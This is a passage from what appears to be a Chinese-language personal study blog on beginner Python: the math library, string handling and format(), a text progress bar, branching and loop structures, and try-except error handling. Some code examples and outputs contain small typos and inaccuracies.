0j)\n报错TypeError\n99.0\nMath库的使用 Math概述 继前章的turtle使用，目前还对库引用比较生疏，而且刚了解到数学运算符，对它也相对陌生，正好利用这个案例把这两部分巩固一下。又能学库的引用还能认识更多的数学函数在Python的样子，岂不美哉？\nMath 库是 Python 提供的内置数学类函数库，因为复数类型常用于科学计算，一般计算并不常用，因此math 库不支持复数类型，仅支持整数和浮点数运算。math库一共提供了4个数学常数和44个函数。44个函数共分为4类，包括16个数值表示函数、8个幂对数函数、16个三角对数函数和4个高等特殊函数。\n大家可以去官网看看，太多函数了，描述很详细，链接在上面。\n案例：天天向上的力量\n1 2 3 4 import math dayup = math.pow((1.0 + 0.001),365）#提高0.001 daydown = math.pow((1.0 - 0.001),365) #放任0.001 print(\u0026#34;向上:{:.2f}，向下:{:.2f}.\u0026#34;.format(dayup, daydown)） 向上：1.44，向下：0.69\n字符串类型及其操作 字符串类型的表示 字符串是字符的序列表示，可由一对单双三引号构成。\n单引号字符串：\u0026ldquo;单引号表示，可以使用\u0026quot;双引号\u0026quot;作为字符串的一部分'\n双引号字符串：\u0026ldquo;双引号表示，可以使用\u0026rsquo;单引号\u0026rsquo;作为字符串的一部分”\n三引号字符串：“三引号表示可以使用\u0026quot;双引号\u0026rdquo;\n\u0026lsquo;单引号\u0026rsquo;\n也可以换行\n\u0026rsquo;''\n如下例子：\n1 2 3 4 5 6 7 8 s = \u0026#39;adj\u0026#39; #定义单行字符串 s = \u0026#34;adj\u0026#34; s = \u0026#39;\u0026#39;\u0026#39;adj adj CTF\u0026#39;\u0026#39;\u0026#39; #定义多行字符串 s = \u0026#34;\u0026#34;\u0026#34;6 4 66\u0026#34;\u0026#34;\u0026#34; #定义多行字符串 反斜杠字符（\\）是一个特殊字符，在字符中表示转义，即该字符与后面相邻的一个字符共同组成了新的含义。如，\\n表示换行、\\t表示制表符（Tab）等等。\n1 print(\u0026#34;Python\\n语言\\t程序\\t设计\u0026#34;) Python\n语言\t程序\t设计\n以下是Python的各种转义字符：\n转义字符 描述 \\（在行尾时） 续行符 \\\\ 反斜杠符号 \\' 单引号 \\\u0026rdquo; 双引号 \\a 响铃 \\b 退格（Backspace） \\e 转义 \\000 空 \\n 换行 \\v 纵向制表符 \\t 横向制表符 \\r 回车 \\f 换页 \\oyy 八进制数yy代表的字符，如：\\o12代表换行 \\xyy 十进制数yy代表的字符，如：\\x0a代表换行 \\other 其它的字符以普通格式输出 这个\\a很有意思啊，真会响铃啊，不过得在终端才会这样的，在其它编程软件可能不会这样的，你可以去试一试。\n字符与切片 前章已经介绍，字符串包括两种序号体系：正向递增序号和反向递减序号s。\n如果字符串长度为L,正向递增需要以最左侧字符序号为0,向右依次递增，最右侧字符序号为L-1：反向递减序号以最右侧字符序号为-1，向左依次递减，最左侧字符序号为-L。这两种索引字符的方法可以在一个表示中使用。司Python 字符串也提供区间访问方式，采用[N:M]格式，表示字符串中从N到M（不包含M）的子字符串，其中，N和M为字符串的索引序号，可以混合使用正向递增序号和反向递减序号。如果表示中M或者N索引缺失，则表示字符串把开始或结束索引值设为默认值。\n字符串以Unicode编码存储，因此，字符串的英文字符和中文字符都算作1个字符。 观察下面实例：\n1 2 3 4 5 6 7 8 name = \u0026#34;Python语言程序设计\u0026#34; name[0] print(name[0],name[7],name[-1]) print(name[2:-4]) print(name[:6]) print(name[6:]) print(name[:]) 以下为输出结果，一一对应：\n\u0026lsquo;P\u0026rsquo;\n\u0026lsquo;P 言 计\u0026rsquo;\nthon语言\nPython\n语言程序设计\nPython语言程序设计\n字符串操作符 Python很厉害哈，数学1+1，我Python直接字符串相加：\n​ 基本的字符串操作符\n操作符 描述 x + y 连接两个字符串x与y x * n或n * x 复制n次字符串x x in s 如果x是s的子串，返回True，否则返回False索引 str[i] 返回第i个字符 str[N:M] 切片，返回索引第N到第M的字符串，其中不包含M 这里有个易错点，我先声明下，关于操作符x in s的使用：\n1 2 t = \u0026#39;fasd\u0026#39; print(\u0026#39;as\u0026#39; in t) #判断as是否在t字符串当中 True\n但是：sd\n1 2 t = \u0026#39;fasd\u0026#39; print(\u0026#39;ad\u0026#39; in t) #判断ad是否在t字符串当中 False\n为什么是错的？ad不都在fasd字符串当中吗？这可不是哦，因为ad这是一个字符串，fasd也是一个字符串，都是一个整体，连在一起的，fasd可没有连在一起的ad哦，只有分开的才有。要当心！\n内置的字符串处理函数 Python解释器提供了一些内置函数。其中，有6个函数与字符串处理相关，如下表所示：\n函数 描述 len(x) 返回字符串x的长度，也可返回其他组合数据类型元素个数 str(x) 返回任意类型x所对应的字符串形式 chr(x) 返回Unicode编码x对应的单字符 ord(x) 返回单字符表示的Unicode编码 hex(x) 返回整数×对应十六进制数的小写形式字符串 oct(x) 返回整数x对应八进制数的小写形式字符串 len(x)返回字符串x的长度，Python 3以Unicode 字符为计数基础，因此，字符串中英文字符和中文字符都是1个长度单位。\n1 2 len(\u0026#34;Python语言程序设计\u0026#34;) len(\u0026#34;\\n\u0026#34;) #\\n表示一个“换行”字符 12\n1\n1 Str(3.1415926) \u0026lsquo;3.1415926\u0026rsquo;\n每个字符在计算机中可以表示为一个数字，称为编码。字符串则以编码序列方式存储在计算机中。目前，计算机系统使用的一个重要编码是ASCI编码，该编码用数字0～127表示计算机键盘上的常见字符以及一些被称为控制代码的特殊值,例如，大写字母A～Z用65～90表示，小写字母a～z用97～122表示。\nASCII 编码针对英语字符设计，它没有覆盖其他语言存在的更广泛字符，因此，现代计算机系统正逐步支持一个更大的编码标准 Unicode，它支持几乎所有书写语言的字符。Python 字符串中每个字符都使用 Unicode编码表示。\nchr这个函数就和unicode有关啦；\n1 chr(97) #返回Unicode编码a对应的单字符 \u0026lsquo;a\u0026rsquo;\n1 2 hex(255) #返回整数255对应十六进制数的小写形式字符串 oct(-255) #返回整数-255对应八进制数的小写形式字符串 \u0026lsquo;0xff\u0026rsquo;\n\u0026lsquo;-0o377\u0026rsquo;\n内置的字符串处理方法 在Python 解释器内部，所有数据类型都采用面向对象方式实现，封装为一个类。 字符串也是一个类，它具有类低《a》.《b》()形式的字符串处理函数。在面向对象中，这类函数被称为“方法”。字符串类型共包含43个内置方法。鉴于部分内置方法并不常用，限于篇幅，这里仅介绍其中16个常用方法，如下表所示：\n方法 描述 str.lower() 返回字符串str的副本，全部字符小写 str.upper() 返回字符串str的副本，全部字符大写 str.islower() 当str所有字符都是小写时，返回True，否则返回 False str.isprintable() 当str所有字符都是可打印的,返回True,否则返回 False str.isnumeric() 当str所有字符都是数字时，返回True，否则返回 False str.isspace()（少用） 当str所有字符都是空格，返回True，否则返回 False str.endswith(suffix[,start[,end]]) str[start: end]以suffix结尾返回True，否则返回False str.startwith(prefix[,start[,end]]) str[start: end]以prefix开始返回 True，否则返回False str.split(sep=None,maxsplit=-1) 返回一个列表，由str根据 sep被分隔的部分构成 str.count(sub[,start[,end]]) 返回 str[start: end]中 sub子串出现的次数 str.replace(old,new[,count]) 返回字符串str的副本，所有old子串被替换为new，如果count给出，则前count次old出现被替换 str.center(width[,fillchar]) 字符串居中函数 str.strip([chars]) 返回字符串str的副本，在其左侧和右侧去掉chars中列出的字符 str.zfill(width) 返回字符串str的副本，长度为 width，不足部分在左侧添0 str.format() 返回字符串str的一种排版格式 str.join(iterable) 返回一个新字符串，由组合数据类型iterable变量的每个元素组成，元素间用str分隔 字符串类型的格式化 要点：字符串通过format()方法进行格式化处理。\n为什么会有字符串类型的格式化问题呢？例如，一个程序希望输出如下内容： “2016-12-31：计算机PYTHON的 CPU占用率为10%。”\n其中，下画线内容可能会变化，需要由特定函数运算结果进行填充，最终形成上述格式字符串作为输出结果。字符串格式化用于解决字符串和变量同时输出时的格式安排。\n字符串是程序向控制台、网络、文件等介质输出运算结果的主要形式之一，为了能提供更好的可读性和灵活性，字符串类型的格式化是运用字符串类型的重要内容之一。Python 语言同时支持两种字符串格式化方法，一种类似C语言中printf()函数的格式化方法，支持该方法主要考虑与大批C语言程序员编程习惯相一致；另一种采用专门的 str.format()格式化方法。由于 Python中更为接近自然语言的复杂数据类型（如列表和字典等)无法通过类C的格式化方法很好表达，Python已经不在后续版本中改进C风格格式化方法。Python 语言将主要采用 format()方法进行字符串格式化。以下是关于format的讲解。\nFormat()方法的基本使用 字符串format()方法的使用格式：\n\u0026lt;模板字符串\u0026gt;.format(\u0026lt;逗号分隔的参数\u0026gt;)\n模板字符串由一系列槽组成，用来控制修改字符串中嵌入值出现的位置，槽用大括号{}表示，如果大括号里面没有序号的话，默认按当前自然顺序来排序。如下：\n1 print(\u0026#34;{}: 计算机{}的CPU占用率为{}%。\u0026#34;.format(\u0026#34;2025-8-11\u0026#34;,\u0026#34;Python\u0026#34;,10)) 计算机Python的CPU占用率为10%。\nformat()方法可以非常方便地连接不同类型的变量或内容，如果需要输出大括号，采用{{表示，}表示}，例如：\n1 \u0026#34;{}{}{}\u0026#34;.format(\u0026#34;圆周率是\u0026#34;,3.1415926,\u0026#34;...\u0026#34;) 圆周率是3.1415926\u0026hellip;\n当然，也可在大括号里面放序号进行排序：\n1 \u0026#34;圆周率{{1}{2}}是{0}\u0026#34;.format(\u0026#34;无理数\u0026#34;,3.1415926,\u0026#34;...\u0026#34;) 圆周率(3.1415926\u0026hellip;)是无理数\nFormat()方法的格式控制 format()方法中模板字符串的槽除了包括参数序号，还可以包括格式控制信息。 此时，槽的内部样式如下： {\u0026lt;参数序号\u0026gt;：\u0026lt;格式控制标记\u0026gt;}\n其中，格式控制标记也用来控制参数显示时的格式：\n: 引导符号 \u0026lt;填充\u0026gt; 用于填充单个字符 \u0026lt;对齐\u0026gt; \u0026lt;左对齐；\u0026gt;右对齐；^居中对齐 \u0026lt;宽度\u0026gt; 槽的设定输出宽度 \u0026lt;,\u0026gt; 数字的千位分隔符适用于整数和浮点数 \u0026lt;.精度\u0026gt; 浮点数小数部分的精度或字符串的最大输出长度 \u0026lt;类型\u0026gt; 整数类型b,c,d,o,x,X,浮点数类型e,E,f,% 格式控制标记包括\u0026lt;填充\u0026gt;、\u0026lt;对齐\u0026gt;、\u0026lt;宽度\u0026gt;、\u0026lt;、\u0026gt;、\u0026lt;.精度\u0026gt;、\u0026lt;类型\u0026gt;6 个字段，这些字段都是可选的，可以组合使用，这里按照使用方式逐一介绍。\n\u0026lt;宽度\u0026gt;、\u0026lt;对齐\u0026gt;和\u0026lt;填充\u0026gt;是 3个相关字段。\u0026lt;宽度\u0026gt;指当前槽的设定输出字符宽度，如果该槽对应的 format)参数长度比\u0026lt;宽度\u0026gt;设定值大，则使用参数实际长度； 如果该值的实际位数小于指定宽度，则位数将被默认以空格字符补充。\u0026lt;对齐\u0026gt;指参数在宽度内输出时的对齐方式，分别使用\u0026lt;、\u0026gt;和^ 3个符号表示左对齐、右对齐和居中对齐。\u0026lt;填充\u0026gt;指宽度内除了参数外的字符采用什么方式表示，默认采用空格，可以通过填充更换。例如：\n1 2 3 4 5 6 7 8 9 10 11 S = \u0026#34;PYTHON\u0026#34; \u0026#34;{0:30}\u0026#34;.format(s) #默认左对齐 #输出\u0026#39;PYTHON \u0026#39; \u0026#34;{0:\u0026gt;30}\u0026#34;.format(s) #右对齐 #输出\u0026#39; PYTHON\u0026#39; \u0026#34;{0:*^30}\u0026#34;.format(s) #居中且使用*填充，加上原本的6个字符位，一共占30位 \u0026gt;\u0026gt;\u0026gt;\u0026#39;************PYTHON************\u0026#39; \u0026#34;{0:-^30}\u0026#34;.format(s）#居中且使用-填充 #输出\u0026#39;------------PYTHON------------\u0026#39; \u0026#34;{0:3}\u0026#34;.format(s) #输出PYTHON 格式控制标记中的逗号（,)用于显示数字类型的千位分隔符，例如：\n1 2 3 4 5 6 \u0026#34;{0:-^20,}\u0026#34;.format(1234567890） #输出\u0026#39;---1,234,567,890----17 \u0026#34;{0:-^20}\u0026#34;.format(1234567890）#对比输出 #输出1-----1234567890-----18 \u0026#34;{0:-^20,}\u0026#34;.format(12345.67890） #输出1----12,345.6789-----193 \u0026lt;.精度\u0026gt;表示两个含义，由小数点(.)开头。对于浮点数，精度表示小数部分输出的有效位数。对于字符串，精度表示输出的最大长度。\n1 2 3 4 5 6 \u0026#34;{0:.2f}\u0026#34;.format(12345.67890） #输出\u0026#39;12345.68\u0026#39; \u0026#34;{0:H^20.3f}\u0026#34;.format(12345.67890) #输出\u0026#39;HHHHH12345.679HHHHHH\u0026#39; \u0026#34;{0:.4}\u0026#34;.format(\u0026#34;PYTHON\u0026#34;) #输出\u0026#39;PYTH\u0026#39; \u0026lt;类型\u0026gt;表示输出整数和浮点数类型的格式规则。对于整数类型，输出格式包括以下6种：\n（1）b：输出整数的二进制方式。\n（2) c：输出整数对应的Unicode 字符。\n（3）d：输出整数的十进制方式。\n（4）o:输出整数的八进制方式。\n（5）x:输出整数的小写十六进制方式。\n（6）X：输出整数的大写十六进制方式。\n1 print(\u0026#34;{0:b},{0:c},{0:d},{0:o},{0:x},{0:X}\u0026#34;.format(425)) 110101001,Ʃ,425,651,1a9,1A9\n对于浮点数类西输出格式包括以下4种。\n（1）e：输出浮点数对应的小写字母e的指数形式。\n（2）E：输出浮点数对应的大写字母E的指数形式。\n（3）f：输出浮点数的标准浮点形式。\n（4）%：输出浮点数的百分形式。\n浮点数输出时尽量使用\u0026lt;.精度\u0026gt;表示小数部分的宽度，有助于更好控制输出格式。\n1 2 \u0026#34;{0:e},{0:E},{0:f},{0:%}\u0026#34;.format(3.14) \u0026#34;{0:.2e},{0:.2E},{0:.2f},{0:.2%}\u0026#34;.format(3.14) 3.140000e+00,3.140000E+00,3.140000,314.000000%\n3.14e+00,3.14E+00,3.14,314.00%\n字符串和字节流:\n字节流是字节组成的序列，字节由固定的8个比特组成，因此，字节流从二进制角度有确定的长度和存储空间。Python字符串由编码字符的序列组成，字符 根据编码不同长度也不相同。因此，从存储空间角度，字符串和字节流不相同。\n硬盘上所有文件都以字节形式存储，例如文本、图片及视频等，真正存储和传输数据时都是以字节为单位。字符值在内存中形成，由字节流经过编码处理后产生。\n案例：文本进度条 进度条是计算机处理任务或执行软件中常用的增强用户体验的重要手段，它能够实时显示任务或软件的执行进度。本节将利用Python 字符串处理方法实现文本进度条功能。\n最简单地，利用print)函数实现简单的非刷新文本进度条。基本思想是按照任务执行百分比将整个任务划分为100个单位，每执行 N%输出一次进度条。每一行输出包含进度百分比，代表已完成的部分（*）和未完成的部分（..）的两种字符，以及一个跟随完成度前进的小箭头，风格如下：\n1 %10 [*****-\u0026gt;.....................................] 由于程序执行速度远超过人眼的视觉停留时间，直接进行字符输出几乎是瞬间完成，不利于观察。为了模拟任务处理的时间效果，调用Python标准时间库 time，使用 time.sleep(t)函数将当前程序暂时挂起ts,t可以是小数。由此可以接近真实的模拟进度条效果输出。使用import保留字调用 time库。\n1 import time 接下来我将运用上节所讲到的format()来举几个例子：\n默认情况，print()函数在输出结尾处会自动产生一\u0026rsquo;\\n\u0026rsquo;，即换行符，从而让光标自动移动到下一行行首，这样上一步输出依旧保存在界面上。\n采用for循环和print()函数构成程序的主体部分，输出百分比最高（100%）为3位数据，为了使输出显得整齐，可以使用{:^3.0f}格式化百分比部分。这个简单的文本进度条代码如下。变量scale 表示输出进度条的精度，读者可以修改这个值去观察效果变化。\n1 2 3 4 5 6 7 8 9 import time scale = 10 print(\u0026#34;------执行开始------\u0026#34;) for i in range(scale + 1): a, b = \u0026#39;**\u0026#39; * i, \u0026#39;..\u0026#39; * (scale - i) c = (i / scale) * 100 print(\u0026#34;\\r%{:^3.0f}[{}-\u0026gt;{}]\u0026#34;.format(c, a, b), end=\u0026#34;\u0026#34;) #居中 time.sleep(0.1) print(\u0026#34;\\n------执行结束------\u0026#34;) 这个代码运行后就比较像那种加载界面的进度条了。。\n具体还需要自己刷题来熟悉format()。\n第四章：程序的控制结构 要点: 程序由3种基本结构组成：顺序结构、分支结构和循环结构。\n程序的基本结构 程序流程图 程序流程图用一系列图形、流程线和文字说明描述程序的基本操作和控制流程，它是程序分析和过程描述的最基本方式。流程图的基本元素包括7种，如图所示。\n学过C语言或者其它基础编程语言的对这方面比较熟悉。\n其中，起止框表示一个程序的开始和结束；判断框判断一个条件是否成立，并根据判断结果选择不同的执行路径；处理框表示一组处理过程；输入/输出框表示数据输入或结果输出；注释框增加程序的解释；流向线以带箭头直线或曲线形式指示程序的执行路径；连接点将多个流程图连接到一起，常用于将一个较大流程图分隔为若干部分。下图所示为一个流程图示例，为了便于描述，采用连接点A将流程图分成两个部分。\n像上面这张图，就很清晰，比你用代码去写思维导图就好很多，直接用图表示你的想法，再用图去转换回对应的函数、代码、语句，这是我们未来从事计算机行业很好的的交流手段之一，一定要善用这些技巧，学习交流才无阻！\n程序的基本结构 目前为止，计算机程序可以看作是一条一条顺序执行的代码。顺序结构是程序的基础，但单一的顺序结构不可能解决所有问题，因此需要引入控制结构来更改程序的执行顺序以满足多样的功能需求。\n程序由3种基本结构组成：顺序结构、分支结构和循环结构。这些基本结构都有一个入口和一个出口。任何程序都由这3种基本结构组合而成。为了直观展示程序结构，这里采用流程图方式描述。\n顺序结构是程序按照线性顺序依次执行的一种运行方式，如图4.3所示，其中语句块1和语句块2表示一个或一组顺序执行的语句。\n分支结构是程序根据条件判断结果而选择不同向前执行路径的一种运行方式，如图所示，根据分支路径上的完备性，分支结构包括单分支结构和二分支结构，二分支结构组合形成多分支结构。\n循环结构是程序根据条件判断结果向后反复执行的一种运行方式，如图，根据循环体触发条件不同,循环结构包括条件循环和遍历循环结构。\n实例 对于一个计算问题，可以用IPO、流程图或者直接以Python代码方式描述。我的建议是功能简单的问题建议直接编写Python代码，功能复杂的问题可以采用IPO 描述或流程图描述为手段。\n我想说的是：“就像速刷高考数学题一样，简单题咱们完全拿下，全部计算过程过一遍，难题我们尽量拿分，把大致过程写出来，不求计算结果，整体结构是对就好。”\n例1：圆面积和周长计算\n程序的描述方式主要有3类，分别是自然语言、流程图和伪代码。\n自然语言描述方式指使用人类语言直接描述程序，IPO描述是其中一种。优点是灵活自然，缺点是容易出现二义性，即一个描述可以产生多种不同的程序代码。\n流程图描述是程序最直观易懂的表达方式，主要适用于较短的算法。优点是直观、清晰且逻辑确定，缺点是流程图绘制比较烦琐，当程序较大时流程图会很复杂，反而降低了表达的清晰性。\n伪代码是介于自然语言与编程语言之间的一种算法描述语言。使用伪代码不用拘泥于具体编程语言，对整个算法运行过程的描述最接近自然语言。与自然语言描述不同，伪代码在保持程序结构的情况下描述算法。由于Python语言语法相对简单，在此没有过多引用伪代码方式来描述程序。（学完C语言和基础Python后又对伪代码感兴趣的，可以去了解下）\n程序的分支结构 要点：Python通过if、 elif、else等保留字提供单分支、二分支和多分支结构。\n单分支结构：if语句 Python中if的语法结构格式：\nif \u0026lt;条件\u0026gt;:\n​ \u0026lt;语句块\u0026gt;\n语句块是if条件满足后执行的一个或多个语句序列，语句块中语句通过与if所在行形成缩进表达包含关系。if语句首先评估条件的结果值，如果结果为True，则执行语句块中的语句序列，然后控制转向程序的下一条语句。如果结果为False，语句块中的语句会被跳过。f语句的控制过程如图所示。（这张图就是上节我所讲解的其中一个IPO描述流程图，想起来了吗？）\nif语句中语句块执行与否依赖于条件判断。但无论什么情况，控制都会转到if语句后与该语句同级别的下一条语句。\nif语句中条件部分可以使用任何能够产生 True 或 False的语句或函数。形成判断条件最常见的方式是采用关系操作符。Python 语言共有6个关系操作符，如表所示。\n操作符 含义 \u0026lt; 小于 \u0026lt;= 小于或等于 \u0026gt;= 大于或等于 \u0026gt; 大于 == 等于 != 不等于 特别注意，Python使用\u0026quot;=\u0026ldquo;表示赋值语句，使用\u0026rdquo;==\u0026ldquo;表示等于\n举个例子：\n一个简化版的空气质量标准采用三级模式：0~35为优，35～75为良，75以上为污染。人们也许不关心PM2.5 指数值具体为多少，而更关心空气质量到底怎样。计算机可以通过PM2.5指数分级发布空气质量提醒。该问题的IPO描述如下。\n输入：接受外部输入的PM2.5值\n处理 ：\nifPM2.5 值≥75，打印空气污染警告\nif 35\u0026lt; PM2.5值\u0026lt;75，打印空气质量良，建议适度户外运动\nif PM2.5 值\u0026lt;35，打印空气质量优，建议户外运动\n输出：打印空气质量提醒\n1 2 3 4 5 6 7 PM = eval(input(\u0026#34;请输入PM2.5数值：\u0026#34;)) if 0 \u0026lt;= PM \u0026lt;= 35: print(\u0026#34;空气优质，快去运动！\u0026#34;) if 35 \u0026lt;= PM \u0026lt;=75: print(\u0026#34;空气良好，适度户外运动！\u0026#34;) if 75 \u0026lt;= PM: print(\u0026#34;空气污染，就不要去啦！\u0026#34;) 下面这个例子是展示字符串对应的unicode编码的比较：\n1 2 3 4 \u0026lt; 5 #True \u0026#34;python\u0026#34; == \u0026#34;python\u0026#34; #True \u0026#34;Python\u0026#34; \u0026gt; \u0026#34;python\u0026#34; #true,英文大写字符对应的unicode编码是要比小写字符要小的 True\nTrue\nFalse\n二分支结构：if-else语句 Python 中if-else语句用来形成二分支结构，语法格式如下：\nif \u0026lt;条件\u0026gt;:\n​ \u0026lt;语句块1\u0026gt;\nelse:\n​ \u0026lt;语句块2\u0026gt;\n语句块1是在f条件满足后执行的一个或多个语句序列，语句块2是f条件不满足后执行的语句序列。二分支语句用于区分条件的两种可能，即True或者 False，分别形成执行路径。\n如果用户只关心空气质量是否污染两种情况，可以通过二分支语句完成。\n1 2 3 4 5 PM = eval(input(\u0026#34;请输入 PM2.5数值：\u0026#34;)) if PM \u0026gt;= 75: print(\u0026#34;空气存在污染，请小心！\u0026#34;) else: print(\u0026#34;空气没有污染，可以开展户外运动！\u0026#34;) 还有一种表达比较简洁一点：\u0026lt;表达式1\u0026gt; if \u0026lt;条件\u0026gt; else \u0026lt;表达式2\u0026gt;\n如果条件比较复杂或者本身入门Python的话建议不要这样写，会出错。\n1 2 PM = eval(input(\u0026#34;请输入 PM2.5数值：\u0026#34;)) print(\u0026#34;空气{}污染!\u0026#34;.format(\u0026#34;存在\u0026#34;if PM \u0026gt;= 75 else\u0026#34;没有\u0026#34;)) 还有一个这样的例子：\n1 2 3 4 5 6 count = 2 count = if count !=0 else \u0026#34;不存在\u0026#34; #2 count = 0 count if count !=0 else \u0026#34;不存在\u0026#34; #不存在 多分支结构：if-elif-else Python 的 if-elif-else 描述多分支结构的语句格式：\nif \u0026lt;条件1\u0026gt;:\n​ \u0026lt;语句块1\u0026gt;\nelif \u0026lt;条件2\u0026gt;:\n​ \u0026lt;语句块2\u0026gt;\n\u0026hellip;\u0026hellip;\nelse:\n​ \u0026lt;语句块N\u0026gt;\n多分支结构是二分支结构的扩展，这种形式通常用于设置同一个判断条件的多条执行路径。Python依次评估寻找第一个结果为True的条件，执行该条件下的语句块，结束后跳过整个 if-elif-else 结构，执行后面的语句。如果没有任何条件成立，else下面的语句块将被执行。else子句是可选的。\n1 2 3 4 5 6 7 PM = eval(input(\u0026#34;请输入 PM2.5数值：\u0026#34;)) if 0= PM\u0026lt;35: print(\u0026#34;空气优质，快去户外运动！\u0026#34;) elif 35\u0026lt;=PM \u0026lt;75: print(\u0026#34;空气良好，适度户外活动！\u0026#34;) else: print(\u0026#34;空气污染，请小心！\u0026#34;) 学过C语言的，这里几乎是秒懂的，知道elif后，if和else都是和C语言的规则一样的，这部分的内容我没去找实例来练习，我认为比较简单。\n程序的循环结构 要点：Python通过for、while等保留字提供遍历循环和无限循环的结构。\n根据循环执行次数的确定性，循环可以分为确定次数循环和非确定次数循环。一确定次数循环指循环体对循环次数有明确的定义，这类循环在Python中被称为“遍历循环”,其中，循环次数采用遍历结构中的元素个数来体现，具体采用 for语句实现。非确定次数循环指程序不确定循环体可能的执行次数，而通过条件判断是否继续执行循环体，Python 提供了根据判断条件执行程序的无限循环，采用while语句实现。\n遍历循环：for 语句 Python 通过保留字 for实现“遍历循环”，基本使用方法如下：\nfor \u0026lt;循环变量\u0026gt; in \u0026lt;遍历结构\u0026gt;:\n\u0026lt;语句块\u0026gt;\n之所以称为“遍历循环”，就是用 for 语句循环时，要循环多少次，全看你要 “遍历” 的那个东西里有多少个元素。简单说，就是从那个结构里一个一个把元素拿出来，给循环变量，拿一个就执行一次循环里的内容，直到拿完所有元素为止。\n关于for的语句这有一种扩展模式，就是当for循环正常执行之后，程序会继续执行 else 语句中的内容。else语句只在循环正常执行并结束后才执行，因此，可以在\u0026lt;语句块2\u0026gt;中放置判断循环执行情况的语句。下节将结合continue和 break语句进一步讲解 for语句中else的用法。\nfor \u0026lt;循环变量\u0026gt; in \u0026lt;遍历结构\u0026gt;:\n​ \u0026lt;语句块1\u0026gt;\nelse:\n​ \u0026lt;语句块2\u0026gt;\n这里先给出一个小例子：\n1 2 3 4 5 for s in \u0026#34;BIN\u0026#34;: print(\u0026#34;循环进行中：”+s) else： S=\u0026#34;循环正常结束\u0026#34; print(s) 循环进行中：B\n循环进行中：I\n循环进行中：T\n循环正常结束\n无限循环：while 语句 很多应用无法在执行之初确定遍历结构,这需要编程语言提供根据条件进行循环的语法，称为无限循环，又称条件循环。无限循环一直保持循环操作直到循环条件不满足才结束，不需要提前确定循环次数。\n结构如：\nwhile \u0026lt;条件\u0026gt;:\n​ \u0026lt;语句块\u0026gt;\n其中条件与if语句中的判断条件一样，结果为True和False。\nwhile 语义很简单，当条件判断为True时，循环体重复执行语句块中语句；当条件为False时，循环终止，执行与while同级别缩进的后续语句。当然和for差不多，也有扩展模式的”else组合“\nwhile \u0026lt;条件\u0026gt;:\n\u0026lt;语句块1\u0026gt;\nelse:\n​ \u0026lt;语句块2\u0026gt;\n这种拓展模式和for一样的，当while正常执行完后才会接着执行else语句的内容。\n循环保留字：break和continue break：突破，破坏，打破\ncontinue：继续执行\n循环结构有两个保留字：break 和 continue，它们用来辅助控制循环执行。break用来跳出（突破）最内层 for 或 while 循环，脱离该循环后程序从循环代码后继续执行，例如：\n1 2 3 4 5 for s in \u0026#34;BIT\u0026#34;: for i in range(10): #双重for循环，复合循环 print(s, end=\u0026#34;\u0026#34;) if s==\u0026#34;T\u0026#34;: break BBBBBBBBBBITTTTTTTTTT\n其中，break语句跳出了最内层for循环，但仍然继续执行外层循环。每个break语句只有能力跳出当前层次循环。\ncontinue 用来结束当前当次循环，即跳出循环体中下面尚未执行的语句，但不跳出当前循环。对于while循环，继续求解循环条件。而对于for循环，程序流程接着遍历循环列表。对比continue和break语句，如下：\n1 2 3 4 for s in \u0026#34;PYTHON\u0026#34;: if S==\u0026#34;T\u0026#34;: continue print(s, end=\u0026#34;\u0026#34;) PYHON\n1 2 3 4 for s in \u0026#34;PYTHON\u0026#34;: if s==\u0026#34;T\u0026#34;: break print(s, end=\u0026#34;\u0026#34;) PY\ncontinue语句和 break语句的区别是，continue 语句只结束本次循环，而不终止整个循环的执行;而break 语句则是结束整个循环过程，不再判断执行循环的条件是否成立。\nfor循环和while循环中都存在一个 else 扩展用法。else 中的语句块只在一种条件下执行，即循环正常遍历了所有内容或由于条件不成立而结束循环，没有因为break或return（函数返回中使用的保留字）而退出。continue 保留字对else没有影响。看下面两个例子：\n1 2 3 4 5 6 for s in \u0026#34;PYTHON\u0026#34;: if s==\u0026#34;T\u0026#34;: continue print(s, end=\u0026#34;\u0026#34;) else: print(\u0026#34;正常退出\u0026#34;) PYHON正常退出\n1 2 3 4 5 6 for s in \u0026#34;PYTHON\u0026#34;: if s==\u0026#34;T\u0026#34;: break print(s, end=\u0026#34;\u0026#34;) else: print(\u0026#34;正常退出\u0026#34;) PY\nRandom 库的使用 随机数在计算机应用中十分常见，Python内置的random库主要用于产生各种分布的伪随机数序列。当前阶段能按照对应场景去学会如何套用对应的函数就可。\nRandom 库解析 这里暂时不提及，比较抽象一些，常见的例子是Pi的计算，对于当前网安的学习用处不大，以后补全。。。。\n程序的异常处理 异常处理：try-except 语句 那我们想一下，一个程序不按照既定计算走，执行出错它是会报错的，但是这种报错其实是认为的，这你知道吗？当用户输入数字时，程序正常执行，如果用户输入的不是数字呢？程序终端会不会说中文呢？\n运行这段程序：\n1 2 num = eval (input(\u0026#34;请输入：\u0026#34;)) print(num**2) python报错全是英文，我也看不懂怎么办？其实对于开发者来说，设置一些交互代码，这些代码与用户进行交互时，难免会超出交互代码本身的功能，让代码报错，从而弹出一堆像图上的英文，而用try-except语句能让报错更易懂，能让用户清晰知道自己输入的数据不正确。对于上面代码，可以这样修正：\n1 2 3 4 5 try: num = eval (input(\u0026#34;请输入：\u0026#34;)) print(num**2) except NameError: print(\u0026#34;输入错误，请输入一个整数\u0026#34;) 当报错时，就只会弹出这串中文啦，用户本身也知道自己的输入错误了。\nPython使用try-except语句实现异常处理，基本语法格式如下：\ntry:\n​ \u0026lt;语句块1\u0026gt;\nexcept \u0026lt;异常类型\u0026gt;:\n​ \u0026lt;语句块2\u0026gt;\n当然，还有高级用法：还支持多个except语句，随时应对多种不同报错的回应：\ntry:\n​ \u0026lt;语句块1\u0026gt;\nexcept \u0026lt;异常类型1\u0026gt;\n​ \u0026lt;语句块2\u0026gt;\n\u0026hellip;.\nexcept \u0026lt;异常类型N\u0026gt;\n​ \u0026lt;语句块N+1\u0026gt;\nexcept：\n​ \u0026lt;语句块N+2\u0026gt;\n1到N个except语句后面都指定了异常类型，而最后一个except是面对1-N外的剩余的异常。这个过程很类似前章的if-elif-else语句，也是分支结构的一种表达方式。\n除了try和except保留字外，异常语句还可与else和finally配合使用：\ntry:\n​ \u0026lt;语句块1\u0026gt;\nexcept \u0026lt;异常类型1\u0026gt;\n​ \u0026lt;语句块2\u0026gt;\nelse;\n​ \u0026lt;语句块3\u0026gt;\nfinally:\n​ 